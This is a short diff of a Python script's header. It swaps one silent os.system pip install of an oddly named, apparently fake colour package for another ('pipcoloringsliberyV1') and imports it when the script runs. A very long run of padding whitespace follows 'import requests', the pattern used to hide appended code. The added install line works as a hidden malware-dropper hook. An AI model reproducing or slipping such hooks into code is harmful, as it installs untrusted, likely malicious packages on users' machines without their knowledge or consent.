@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycolorpkgsV2")
-import pycolorpkgsV2
+os.system("pip install pipcoloringsliberyV1")
+import pipcoloringsliberyV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
